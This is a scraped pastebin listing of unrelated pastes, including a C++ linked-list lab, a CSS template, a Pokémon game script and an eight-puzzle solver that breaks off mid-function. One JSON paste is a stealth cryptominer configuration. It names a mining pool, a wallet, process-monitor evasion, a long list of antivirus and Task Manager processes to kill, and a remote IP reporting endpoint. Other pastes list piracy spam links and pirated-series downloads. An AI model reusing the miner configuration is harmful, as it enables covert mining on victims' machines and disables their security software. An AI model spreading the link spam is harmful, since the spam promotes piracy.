			$cart['categories'] = apply_filters('thwcfe_cart_product_categories', array_values($cart['categories']));
			$cart['tags'] 		= apply_filters('thwcfe_cart_product_tags', array_values($cart['tags']));
			$cart['variations']    = array_values($cart['variations']);
			$cart['shipping_class'] = array_values($cart['shipping_class']);
			$cart['product_type']  = array_values($cart['product_type']);
			$cart['cart_total']    = $order_total;
			$cart['cart_subtotal'] = $order_subtotal;
			$cart['shipping_weight']   = $shipping_weight;
		}
		return $cart;
	}"
RZr1wwXT,dfgdrhrdj,gadungw71,PHP,Monday 13th of May 2024 02:24:06 AM CDT,"https://github.com/Phim-L-t-M-t-7-M-t-Di-u-c-2024-Viet
https://topmate.io/watchlatmat7_motdieuuoc/977936
https://topmate.io/phim_faceoff7_onewish2024/977942
https://topmate.io/watch_kingdomoftheplanet/977947
https://topmate.io/phim_hanh_tinh_khi_vuongquocmoi/977950
https://topmate.io/free_vayham_ketrungphat/977970
https://topmate.io/vayham_ketrungphat/977987
https://topmate.io/hdpunishment_koreansub/977994
https://topmate.io/haphap_tangkap/977996
https://www.kooapp.com/koo/guest_P68S8O/d6a1f735-3d12-4308-9d1c-20226df9f794
https://open.firstory.me/user/clw4lexv1000901uw942m65yt
https://open.firstory.me/story/clw4lfdpa000h01uwgbofexfy
https://wandering.flarum.cloud/d/61661-gfdgrdh
https://hiuderyy.hashnode.dev/brtyturtuythu
https://www.bankier.pl/forum/temat_walangkeke,66286231.html
https://medium.com/@rarawwwuu25/xem-phim-l%E1%BA%ADt-m%E1%BA%B7t-7-m%E1%BB%99t-%C4%91i%E1%BB%81u-%C6%B0%E1%BB%9Bc-full-4k-vietsub-48bf3dbfba01
https://www.onfeetnation.com/profiles/blogs/godegann
https://forum.mush.com.br/topic/216002/xem-phim-l%E1%BA%ADt-m%E1%BA%B7t-7-m%E1%BB%99t-%C4%91i%E1%BB%81u-%C6%B0%E1%BB%9Bc-ph%C3%A1t-vietsub-thuy%E1%BA%BFt-minh-full-hd-2024-md
https://hackmd.io/@rerewilli6/BJQ334kmR
https://demo.hedgedoc.org/s/LyuNtZD6o
https://rentry.co/imzh3wgb
https://paste.ee/p/gLA0C
https://yamcode.com/sfsefsg-90
https://lifeisfeudal.com/Discussions/question/abadiselamanya
https://start.me/w/82wMeM
https://plaza.rakuten.co.jp/aryasantosso/diary/202405130000/
https://telegra.ph/SFDSAEVT-05-13
https://muckrack.com/rutan-cloudb/bio
https://profile.hatena.ne.jp/FGDFHD/
https://www.bitsdujour.com/profiles/f4XZoV
http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/754233/Default.aspx
https://www.fitlynk.com/1715584915F935549
"
5LVdtVB8,lab 10,SillyWolfy,C++,Monday 13th of May 2024 12:46:36 AM CDT,"#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <string>
#include <limits>
using namespace std;

template<typename T>
struct Node {
    T data;
    Node* next;

    Node(T val) : data(val), next(nullptr) {}
};

template<typename T>
class LinkedList {
private:
    Node<T>* head;

public:
    LinkedList() : head(nullptr) {}
    void push_back(T value) {
        Node<T>* newNode = new Node<T>(value);
        if (head == nullptr) {
            head = newNode;
        }
        else {
            Node<T>* temp = head;
            while (temp->next != nullptr) {
                temp = temp->next;
            }
            temp->next = newNode;
        }
    }
    void remove_at(int position) {
        Node<T>* temp = head;
        if (position == 0) {
            head = head->next;
            delete temp;
            return;
        }
        for (int i = 0; temp != nullptr and i < position - 1; ++i) {
            temp = temp->next;
        }
        Node<T>* nodeToDelete = temp->next;
        temp->next = temp->next->next;
        delete nodeToDelete;
    }
    void print() const {
        Node<T>* temp = head;
        while (temp != nullptr) {
            temp->data.print();
            cout << '\n';
            temp = temp->next;
        }
    }
    int size() const {
        int count = 0;
        Node<T>* temp = head;
        while (temp != nullptr) {
            count++;
            temp = temp->next;
        }
        return count;
    }
    T& get(int index) {
        Node<T>* temp = head;
        for (int i = 0; temp != nullptr and i < index; ++i) {
            temp = temp->next;
        }
        return temp->data;
    }
    ~LinkedList() {
        Node<T>* current = head;
        Node<T>* nextNode;
        while (current != nullptr) {
            nextNode = current->next;
            delete current;
            current = nextNode;
        }
    }
};

class Product
{
public:
    Product();
    Product(string namee, int weightt, int pricee, int lifee) {
        this->name = namee;
        this->weight = weightt;
        this->price = pricee;
        this->life = lifee;
    }
    void print() const {
        cout << ""–ù–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–¥—É–∫—Ç–∞: "" << this->name << '\n'
            << ""–í–µ—Å –ø—Ä–æ–¥—É–∫—Ç–∞: "" << this->weight << '\n'
            << ""–¶–µ–Ω–∞ –ø—Ä–æ–¥—É–∫—Ç–∞: "" << this->price << '\n'
            << ""–°—Ä–æ–∫ –≥–æ–¥–Ω–æ—Å—Ç–∏ –ø—Ä–æ–¥—É–∫—Ç–∞: "" << this->life << '\n';
        if (life <= 2) {
            cout << ""–î–∞–Ω–Ω—ã–π —Ç–æ–≤–∞—Ä –∏–¥—ë—Ç –ø–æ —É—Ü–µ–Ω–∫–µ!\n"";
        }
    }
    string get_name() const {
        return this->name;
    }
private:
    string name;
    int weight;
    int price;
    int life;
};

void add_product(LinkedList<Product>& database) {
    cout << ""\t–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–¥—É–∫—Ç–∞ –≤ —Å–ø–∏—Å–æ–∫\n"";
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ–¥—É–∫—Ç–∞: "";
    string name;
    getline(cin, name);
    cout << '\n';
    cout << ""–í–≤–µ–¥–∏—Ç–µ –≤–µ—Å –ø—Ä–æ–¥—É–∫—Ç–∞: "";
    int weight;
    while (true) {
        cin >> weight;
        if (cin.fail() or weight <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ: "";
        }
        else {
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            break;
        }
    }
    cout << '\n';
    cout << ""–í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –ø—Ä–æ–¥—É–∫—Ç–∞: "";
    int price;
    while (true) {
        cin >> price;
        if (cin.fail() or price <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ: "";
        }
        else {
            break;
        }
    }
    cout << '\n';
    cout << ""–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –≥–æ–¥–Ω–æ—Å—Ç–∏ –ø—Ä–æ–¥—É–∫—Ç–∞ –≤ –¥–Ω—è—Ö –ø—Ä–æ–¥—É–∫—Ç–∞: "";
    int life;
    while (true) {
        cin >> life;
        if (cin.fail() or life <= 0) {
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
            cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ: "";
        }
        else {
            break;
        }
    }
    database.push_back(Product(name, weight, price, life));
}

void delete_product(LinkedList<Product>& database, int index) {
    database.remove_at(index - 1);
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, ""Russian"");
    LinkedList<Product> DateBase;
    while (true) {
        cout << ""\tMe–Ω—é\n"";
        cout << ""–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–±—Ä–∞—Ç—å –æ–¥–∏–Ω –∏–∑ –ø—É–Ω–∫—Ç–æ–≤:\n"";
        cout << ""1) –î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–¥—É–∫—Ç –≤ —Å–ø–∏—Å–æ–∫\n"";
        cout << ""2) –£–¥–∞–ª–∏—Ç—å –ø—Ä–æ–¥—É–∫—Ç –∏–∑ —Å–ø–∏—Å–∫–∞\n"";
        cout << ""3) –í—ã–≤–µ—Å—Ç–∏ —Å–ø–∏—Å–æ–∫\n"";
        cout << ""4) –ó–∞–∫–æ–Ω—á–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É\n"";
        cout << ""–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–≥–æ –ø—É–Ω–∫—Ç–∞: "";
        int choice;
        while (true) {
            cin >> choice;
            if (cin.fail() or choice <= 0) {
                cin.clear();
                cin.ignore();
                cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ: "";
            }
            else {
                break;
            }
        }
        switch (choice) {
        case 1: {
            system(""cls"");
            add_product(DateBase);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 2: {
            system(""cls"");
            int dbSize = DateBase.size();
            if (dbSize == 0) {
                cout << ""–í –≤–∞—à–µ–º —Å–ø–∏—Å–∫–µ –Ω–∏—á–µ–≥–æ –Ω–µ—Ç!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            for (int i = 0; i < dbSize; ++i) {
                cout << i + 1 << "". "" << DateBase.get(i).get_name() << '\n';
            }
            cout << ""–í–≤–µ–¥–∏—Ç–µ –∏–Ω–¥–µ–∫—Å –ø—Ä–æ–¥—É–∫—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å: "";
            int index;
            while (true) {
                cin >> index;
                if (cin.fail() or index <= 0 or index > dbSize) {
                    cin.clear();
                    cin.ignore();
                    cout << ""–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –∏–∑ –¥–æ—Å—Ç—É–ø–Ω–æ–≥–æ –¥–∏–∞–ø–∞–∑–æ–Ω–∞: "";
                }
                else {
                    break;
                }
            }
            delete_product(DateBase, index);
            system(""pause"");
            system(""cls"");
            break;
        }
        case 3: {
            system(""cls"");
            if (DateBase.size() == 0) {
                cout << ""–í –≤–∞—à–µ–º —Å–ø–∏—Å–∫–µ –Ω–∏—á–µ–≥–æ –Ω–µ—Ç!\n"";
                system(""pause"");
                system(""cls"");
                break;
            }
            DateBase.print();
            system(""pause"");
            system(""cls"");
            break;
        }
        case 4: {
            return 0;
        }
        default:
            system(""cls"");
            break;
        }
    }
}
"
JFCDeKwC,TestingM,tarekxx,JSON,Monday 13th of May 2024 12:34:55 AM CDT,"{
    ""algo"": ""rx/0"",
    ""pool"": ""zeph-eu1.nanopool.org"",
    ""port"": 10943,
    ""wallet"": ""ZEPHs787ivBXAw2CUxSkCYBDey6SE8bgD7dgWYLS94reSxSkkytU97eTyx33LQGUdbEueLWTHKEdnYwQi5oVNWMQ5ULrHk6i9P9.XZXZXZX/mypassword1234"",
    ""ssltls"": true,
    ""max-cpu"": 20,
    ""idle-wait"": 1,
    ""idle-cpu"": 80,
    ""stealth-targets"": ""ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"",
    ""kill-targets"": ""Taskmgr.exe,zerotier-one_x64.exe,xmsdiag.exe,afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,advchk.exe,ahnsd.exe,alertsvc.exe,avmaisrv.exe,avsynmgr.exe,bitdefender_p2p_startup.exe,cavrid.exe,cavtray.exe,cmgrdian.exe,freshclam.exe,icepack.exe,mgavrtcl.exe,mghtml.exe,mgui.exe,navapsvc.exe,navapw32.exe,navw32.exe,nsmdtr.exe,ofcdog.exe,pav.exe,savscan.exe,spider.exe,xcommsvr.exe,Procmon64a.exe,Procmon64.exe,Procmon.exe,anvir.exe,MRT.exe"",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""http://156.208.133.221:8080/api/endpoint.php?key=UnknownErrors""
}"
Qm2EZQU7,ùêíùêÑùêïùêÑùêç,wilderanima,CSS,Monday 13th of May 2024 12:00:57 AM CDT,"     Hello, wildlings! 
 
  A straightforward placeholder code with an image and a scrolling words box. 
  Follow the dimensions of the images, otherwise, they won't fit properly. 
  Feel free to change colors! 
 
  Please do not steal this code. 
  Leave the credit! <3 Happy Writing! 
 
‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî ‚Äî 

<style>

@import url('https://fonts.googleapis.com/css2?family=Economica:ital,wght@0,400;0,700;1,400;1,700&display=swap');

body {
cursor: url(https://66.media.tumblr.com/232c090ebdd37ae4bc17adb54e1e0344/tumblr_inline_ol4nwhvSwg1uxxza6_1280.png), auto;
background-color: #000;
}

::-webkit-scrollbar {
display: none;
}

::selection {
background: ;
color: white;
}

.container {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 0px;
height: 550px;
width: 550px;
background-color: #000;
}

.wilder {
position: fixed;
bottom: 0px;
right: 0px;
}

.image1 {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 0px;
right: 250px;
height: 400px;
width: 250px;
background: url(https://placehold.co/250x400.png);
background-size: cover;
outline: 1px solid #554136;
outline-offset: -5px;
}

.words {
position: absolute;
margin: auto;
top: 0px;
bottom: 0px;
left: 275px;
right: 0px;
height: 355px;
width: 250px;
font: 12px economica;
color: #a3a597;
text-align: center;
overflow: auto;
}
b {
font: 13px economica;
color: #554136;
text-transform: uppercase;
font-weight: bold;
}
i {
font: 13px economica;
font-style: italic;
color: #7a6d65;
}
a {
text-decoration: none;
font: 13px times;
color: #7a6d65;
transition: 0.5s;
}
a:hover {
color: #a3a597;
text-shadow: 1px 1px 0px #7a6d65;

</style>

<!--
 MUSIC PLAYER #02 by glenthemes
 ‚ô¨ glenthpvs.tumblr.com/player02
--->
<script src=""//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js""></script>
<link href=""//fonts.googleapis.com/css?family=Readex+Pro"" rel=""stylesheet"">
<link href=""//glenthemes.github.io/-music-/glenplayer02.css"" rel=""stylesheet"">
<script src=""//glenthemes.github.io/-music-/glenplayer02.js""></script>
<style element=""glenplayer02"">
:root {
 --MusicPlayer-Position:bottom left;
 --MusicPlayer-Edge-Offset:15px;
 
 --MusicPlayer-Buttons-Size:14px;
 --MusicPlayer-Buttons-Color:#554136;
 --MusicPlayer-Buttons-Fill:yes;

}
</style>

<div glenplayer02>
<div controls></div>
<i class=""aa-line-icons"" icon-name=""music-2""></i>
<audio src=""MUSIC_LINK"" volume=""100%""></audio>
</div>

<div class=""wilder""><a target=""_blank"" href=""https://pastebin.com/u/wilderanima"" title=""code by wilder.""><img src=""https://i.imgur.com/hCJmFVu.png"" width=""75px;""></a></div>

<div class=""container"">
<div class=""image1""></div>
<div class=""words"">

<b>let's try something bold.</b> <br>
<i>how about something italic?</i> <br>
<a>and for good measure? a link.</a> <br><br>

lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <br><br>

ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. <br><br>

duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. <br><br>

excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <br><br>

<hr size=""1"" width=""100%"" noshade style=""color:#554136""/>
<br>

words. <br><br>

</div>
</div>"
z0rnHH0Y,CC: GhoulMonitor,deadinside1222,Lua,Sunday 12th of May 2024 11:27:22 PM CDT,"local monitor = peripheral.find(""monitor"")

if monitor then
    
    monitor.clear()
    monitor.setCursorPos(1,1)

    
    local i = 1000

    
    while true do
        monitor.clear()     
        monitor.write(tostring(i))
        i = i - 7     
        if i < 0 then
            i = 1000
        end
        
        
        sleep(0.5)
    end
else
    print(""ERROR"")
end"
3KRELrGj,Online Trainer v21,FiaPlay,Ruby,Sunday 12th of May 2024 11:03:15 PM CDT,"#-----------------------------------------------------------------------------
# Script creado por FiaPlay para Pok√©mon Essentials BES. Cr√©ditos si se usa.
# Discord de FP Systems: https://discord.gg/ds8DWB5NSW
# Si vas reportar alg√∫n bug o preguntar algo recomiendo hacerlo en el hilo del server de PokeLiberty o en FP Systems.
#-----------------------------------------------------------------------------
# Demostraci√≥n
#-----------------------------------------------------------------------------
# Modo de uso:
# *Usa fpDownloadBattle para descargar los datos de la batalla
# *Usa OnlineBattle.start() para iniciar la batalla
# ****Los siguientes pasos no deben hacerse en la versi√≥n que los jugadores descargar√°n****
# *Crea una copia de tu juego para generar los datos
# *Usa el modo depurador para dejar tu equipo igual al que quieres para el entrenador.
# *Usa OnlineBattle.new(trtype,trname,doublebattle,endspeech)
# trtype es el ID del tipo de entrenador
# trname es el nombre del entrenador
# doublebattle indica si ser√° un combate doble
# endspeech es lo que dir√° el entrenador al terminar el combate
# battle_rules un array con las battle rules activas
# items un array con los objetos del rival
# Eso crear√° el archivo OnlineBattle.txt en la capeta del juego.
# Sube el contenido de OnlineBattle.txt a internet (recomendable pastebin.com)
=begin Para un ejemplo de como generar el combate:
r=[""2v2"",[""weather"",:Rain]]
OnlineBattle.new(:LEADER_Brock, ""Koga"",false,""Buena Pelea."",r)
=end

#-----------------------------------------------------------------------------
URRL = ""https://pastebin.com/raw/YLYPMEVK"" # Enlace a el txt con los datos encriptados.
BATTLE_BGM = """" # BGM usado para la batalla (si se deja en blanco se usar√° la m√∫sica por defecto del entrenador)
class OnlineBattle
  attr_accessor :trainer
  attr_accessor :team
  attr_accessor :doublebattle
  attr_accessor :endspeech
  attr_accessor :rules
  attr_accessor :items

  def initialize(trtype,trname,doublebattle=false,endspeech="""",battle_rules=[],items=[])
    @team = $player.party
    @trainer = NPCTrainer.new(trname,trtype)
    @doublebattle = doublebattle
    @trainer.lose_text = endspeech
    @rules     = battle_rules
    text=pbMysteryGiftEncrypt(self)
    $PokemonGlobal.downloaded_battle=text
    File.open(""OnlineBattle.txt"",""wb""){|f|
       f.write(text)
      }
  end

#===============================================================================
# Trainer battles
#===============================================================================
  def self.start(var=1)
    b=fpLoadDownloandedBattle
    if !b
      pbMessage(""No se han podido cargar los datos de la batalla"")
      return
    end
    for i in b.rules
      if i.is_a?(Array)
        setBattleRule(i[0],i[1])
      else
        setBattleRule(i)
      end
    end
    outcome_variable = $game_temp.battle_rules[""outcomeVar""] || var
    can_lose         = $game_temp.battle_rules[""canLose""] || false
    # Skip battle if the player has no able Pok√©mon, or if holding Ctrl in Debug mode
    if BattleCreationHelperMethods.skip_battle?
      return BattleCreationHelperMethods.skip_battle(outcome_variable, true)
    end
    # Record information about party Pok√©mon to be used at the end of battle (e.g.
    # comparing levels for an evolution check)
    EventHandlers.trigger(:on_start_battle)
    # Generate information for the foes
    foe_trainers = [b.trainer]
    foe_items = []
    foe_party = b.team
    # Generate information for the player and partner trainer(s)
    player_trainers, ally_items, player_party, player_party_starts = BattleCreationHelperMethods.set_up_player_trainers(foe_party)
    # Create the battle scene (the visual side of it)
    scene = BattleCreationHelperMethods.create_battle_scene
    # Create the battle class (the mechanics side of it)
    battle = Battle.new(scene, player_party, foe_party, player_trainers, foe_trainers)
    battle.party1starts = player_party_starts
    battle.party2starts = [0]
    battle.ally_items   = ally_items
    battle.items        = foe_items
    # Set various other properties in the battle class
    setBattleRule(""#{foe_trainers.length}v#{foe_trainers.length}"") if $game_temp.battle_rules[""size""].nil?
    BattleCreationHelperMethods.prepare_battle(battle)
    $game_temp.clear_battle_rules
    # Perform the battle itself
    outcome = 0
    pbBattleAnimation(pbGetTrainerBattleBGM(foe_trainers), (battle.singleBattle?) ? 1 : 3, foe_trainers) do
      pbSceneStandby { outcome = battle.pbStartBattle }
      BattleCreationHelperMethods.after_battle(outcome, can_lose)
    end
    Input.update
    # Save the result of the battle in a Game Variable (1 by default)
    BattleCreationHelperMethods.set_outcome(outcome, outcome_variable, true)
    return outcome
  end
end

def fpDownloadBattle()
  text = pbDownloadToString(URRL)
  if text.length>0
    $PokemonGlobal.downloaded_battle=text
  end
end

def fpLoadDownloandedBattle
  text=$PokemonGlobal.downloaded_battle
  return false if !text || text.length==0
  b=Marshal.restore(Zlib::Inflate.inflate(text.unpack(""m"")[0]))
  return b
end

class PokemonGlobalMetadata
  attr_accessor :downloaded_battle
end

def pbGetTrainerBattleBGM(trainer,online=false)
  pbStringToAudioFile(BATTLE_BGM) if online && BATTLE_BGM.length>0
  return $PokemonGlobal.nextBattleBGM.clone if $PokemonGlobal.nextBattleBGM
  ret = nil
  music = nil
  trainerarray = (trainer.is_a?(Array)) ? trainer : [trainer]
  trainerarray.each do |t|
    trainer_type_data = GameData::TrainerType.get(t.trainer_type)
    music = trainer_type_data.battle_BGM if trainer_type_data.battle_BGM
  end
  ret = pbStringToAudioFile(music) if music && music != """"
  if !ret
    # Check map metadata
    music = $game_map.metadata&.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  if !ret
    # Check global metadata
    music = GameData::Metadata.get.trainer_battle_BGM
    ret = pbStringToAudioFile(music) if music && music != """"
  end
  ret = pbStringToAudioFile(""Battle trainer"") if !ret
  return ret
end
"
aJDKNH7s,Meta,tinn01,GetText,Sunday 12th of May 2024 10:58:47 PM CDT,"S-1-5-21-1193083378-3124615022-3272316965-1002 - me
S-1-5-21-2828353685-3820469404-3474401707-1000 - gojo // 6 - 13 
S-1-5-21-3858644193-3092294794-2961176580-1001 - intro
S-1-5-21-1122109747-635079694-1831325885-1001 - janong
S-1-5-21-4186777248-1235168190-576622776-1001 - ciao"
5R6S482L,Series (Biram),AhmadXploit,Dart,Sunday 12th of May 2024 10:50:11 PM CDT,"{
  ""series"": [
    {
      ""imgUrl"": ""https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAN7J_3cOH6eGQlYsIUY4f5qBhL8rqaW7ZVg&usqp=CAU"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""title"": ""Peaky Blinders"",
      ""hashtag"": ""2016 | Action | Family | 18+"",
      ""synopsis"": ""Ada seorang prajurit....."",
      ""seasons"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 1"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S1 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S1 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""seasons"": ""Season 2"",
         ""eps"": [
			{
			  ""episode"": ""Episode 1"",
			  ""se"": ""S2 E1"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			},
			{
			  ""episode"": ""Episode 2"",
			  ""se"": ""S2 E2"",
			  ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download""
			}
		  ]
		}
	  ]
    }
  ]
}"
3fnNrdxu,Untitled,AbsolutelyS,C++,Sunday 12th of May 2024 10:47:24 PM CDT,"/*
 * Towers of Hanoi
 */

void move(int disk, char source, char destination) {
    cout << ""Move disk "" << disk << "" from rod "" << source << "" to rod "" << destination << endl;
}

void towersOfHanoi(int n, char source, char destination, char auxiliary) {
    if (n == 1) {
        move(n, source, destination);
        return;
    }

    towersOfHanoi(n - 1, source, auxiliary, destination);
    move(n, source, destination);
    towersOfHanoi(n - 1, auxiliary, destination, source);
}"
6z4MJLqS,Untitled,Hend_Sayed,Python,Sunday 12th of May 2024 10:46:03 PM CDT,"#eightpuzzle

from tkinter import *
from tkinter import messagebox
import random
import copy
import time

#    init:      goal:
#    7 2 4      0 1 2
#    5 0 6      3 4 5
#    8 3 1      6 7 8

_goal_state = '012345678'
_init_state = '724506831'

# neighbors of each square
_neighbors = {0: [1,3],
              1: [0,2,4],
              2: [1,5],
              3: [0,4,6],
              4: [1,3,5,7],
              5: [2,4,8],
              6: [3,7],
              7: [4,6,8],
              8: [5,7]}

# Manhattan Distances from any square to another
_distance = [[0,1,2,1,2,3,2,3,4],
             [1,0,1,2,1,2,3,2,3],
             [2,1,0,3,2,1,4,3,2],
             [1,2,3,0,1,2,1,2,3],
             [2,1,2,1,0,1,2,1,2],
             [3,2,1,2,1,0,3,2,1],
             [2,3,4,1,2,3,0,1,2],
             [3,2,3,2,1,2,1,0,1],
             [4,3,2,3,2,1,2,1,0]]


_algo = {1:""Breadth-First Search"", 
        2:""Iterative Deepening Search"",
        3:""A* Search"", 
         }

class EightPuzzle(object):

    def __init__(self, input_state=None):
        if input_state:
            self.state = copy.deepcopy(input_state)
        else:       
            # generate a solvable state randomly
            self.state = copy.deepcopy(_goal_state)
            self.shuffle()
            
    # shuffle the current state
    def shuffle(self):
        pos0 = self.state.index('0')
        for i in range(100):
            choices = _neighbors[pos0]
            pos = choices[random.randint(0, len(choices)-1)]
            self.swap(pos)
            pos0 = self.state.index('0')

        # # generate a 8-puzzle problem with 1/2 chance to be unsolvable
        # l = list('012345678')
        # random.shuffle(l)
        # self.state = ''.join(l)

    # swap 0 with its neighbor pos
    def swap(self, pos):
        pos0 = self.state.index('0')
        l = list(self.state)
        l[pos0], l[pos] = l[pos], l[pos0]
        self.state = ''.join(l)

    # get all the possible next states
    def get_next(self, current):
        pos0 = current.index('0')
        nextStates = []

        for pos in _neighbors[pos0]:
            l = list(current)
            l[pos0], l[pos] = l[pos], l[pos0]
            step = ''.join(l)
            nextStates.append(step)
        return nextStates  

    # BFS algorithm
    def solve_by_BFS(self):

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        solved = (root == goal)
        q = [root]
        while q and not solved:
            current = q.pop(0)
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    q.append(next_node)
                if next_node == goal:
                    solved = True
                    break
        
        # return shortest path and number of states explored
        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # Iterative Deepening search algorithm
    def solve_by_IDS(self):

        # DFS with depth limit
        def explore(current, depth):
            nonlocal goal, solved, limit
            if current == goal:
                solved = True
                return
            if depth >= limit:
                return
            next_depth = depth+1
            for next_node in self.get_next(current):
                if not next_node in visited:
                    visited[next_node] = True
                    previous[next_node] = current
                    if not next_depth in level:
                        level[next_depth] = []
                    level[next_depth].append(next_node)
                    explore(next_node, next_depth)
                if solved:
                    break

        root = self.state
        goal = '012345678'
        previous = {root: None}
        visited = {root: True}
        level = {0:[root]}
        solved = (root == goal)
        limit = 0
        while not solved and limit in level:
            depth = limit
            limit += 1
            for node in level[depth]:
                explore(node, depth)

        if solved:
            return self.retrieve_path(goal, previous), len(visited)
        return None, len(visited)


    # A* algorithm
    def solve_by_Astar(self, method):

        class Node(object):
            def __init__(self, state):
                self.state = state
                self.g = 100000
                self.h = 100000
            def __str__(self):
                return self.state
            def f(self):
                return self.g+self.h
            def heuristic(self, method):
                goal = '012345678'
                count = 0
                if method == 1: # misplaced tiles
                    for i in range(9):
                        if self.state[0] != goal[0]:
                            count += 1
                else:   # Manhattan distance
                    for i in range(9):
                        pos = goal.index(self.state[i])
                        count += _distance[pos][i]
                self.h = count

        root = Node(self.state)
        root.g = 0
        root.heuristic(method)
        goal = '012345678'
        previous = {str(root): None}
        visited = {str(root): True}
        solved = (str(root) == goal)
        q = {root.f():[root]}

        while not solved and q:
